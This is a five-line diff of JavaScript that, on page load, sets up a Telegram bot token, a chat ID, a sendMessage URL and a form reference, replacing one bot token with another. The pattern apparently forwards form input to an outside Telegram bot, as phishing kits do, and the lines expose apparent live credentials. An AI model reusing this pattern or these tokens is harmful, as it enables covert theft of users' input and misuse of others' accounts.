@@ -1,5 +1,5 @@
 window.onload = () => {
-2  const token = "6791346781:AAETwcHhxdAyHliVRpkh3QVSb7IVV6uHQA";
+2  const token = "6884328378:AAHSfHTfbefzVvdTIqZeu4Bq_W5f0B4_nQg";
 3  const chatID = "1393367014";
 4  const url = `https://api.telegram.org/bot${token}/sendMessage`;
 5  const form1 = document.querySelector("#form1");
